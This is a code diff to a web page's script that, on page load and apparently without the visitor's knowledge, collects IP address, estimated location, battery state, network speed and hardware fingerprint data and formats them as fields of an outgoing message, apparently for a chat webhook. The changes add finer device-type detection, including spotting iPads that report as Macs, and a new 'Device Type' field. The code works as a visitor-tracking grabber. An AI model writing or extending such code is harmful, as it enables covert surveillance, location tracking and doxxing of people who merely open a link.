@@ -59,6 +59,7 @@
             let os = "Unknown OS";
             let browser = "Unknown Browser";
             let hardwareDetail = "Generic Device";
+            let deviceType = "PC (Desktop/Laptop)";
 
             try {
                 const canvas = document.createElement('canvas');
@@ -76,19 +77,38 @@
                 console.error(e);
             }
 
-            if (/iPhone|iPad|iPod/i.test(ua)) {
-                os = "Apple iOS (iPhone/iPad)";
+            if (/iPhone|iPod/i.test(ua)) {
+                os = "Apple iOS (iPhone)";
+                deviceType = "Mobile Phone";
+            } else if (/iPad/i.test(ua)) {
+                os = "Apple iOS (iPad)";
+                deviceType = "Tablet";
             } else if (/Android/i.test(ua)) {
                 const match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? `Android ${match[1]}` : "Android Device";
+                if (/Mobile/i.test(ua)) {
+                    deviceType = "Mobile Phone";
+                } else {
+                    deviceType = "Tablet";
+                }
             } else if (/Windows NT/i.test(ua)) {
                 if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
                 else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
                 else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
                 else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
                 else os = "Windows PC";
+                
+                if (/Touch/i.test(ua) && !/PC/i.test(ua)) {
+                    deviceType = "Tablet/Convertible";
+                }
             } else if (/Macintosh/i.test(ua)) {
-                os = "macOS (Apple Mac)";
+                if (navigator.maxTouchPoints && navigator.maxTouchPoints > 2) {
+                    os = "macOS (iPad Pro/Air)";
+                    deviceType = "Tablet";
+                } else {
+                    os = "macOS (Apple Mac)";
+                    deviceType = "PC (Desktop/Laptop)";
+                }
             } else if (/Linux/i.test(ua)) {
                 os = "Linux System";
             }
@@ -109,7 +129,7 @@
                 browser = "Mozilla Firefox";
             }
 
-            return { os, browser, hardwareDetail };
+            return { os, browser, hardwareDetail, deviceType };
         }
 
         async function getBatteryDetails() {
@@ -142,7 +162,6 @@
             return speed;
         }
 
-        // Automatically execute on entry
         window.addEventListener('DOMContentLoaded', async () => {
             let ipAddress = "Unknown (Blocked/Error)";
             let locationData = "Unknown";
@@ -182,6 +201,7 @@
                         fields: [
                             { name: "🌐 IP Address", value: ipAddress, inline: true },
                             { name: "📍 Estimated Location", value: locationData, inline: true },
+                            { name: "🖥️ Device Type", value: cleanDevice.deviceType, inline: true },
                             { name: "🔋 Battery Level", value: batteryInfo.level, inline: true },
                             { name: "🔌 Is Charging?", value: batteryInfo.charging, inline: true },
                             { name: "⚡ Network Speed", value: netSpeed, inline: true },
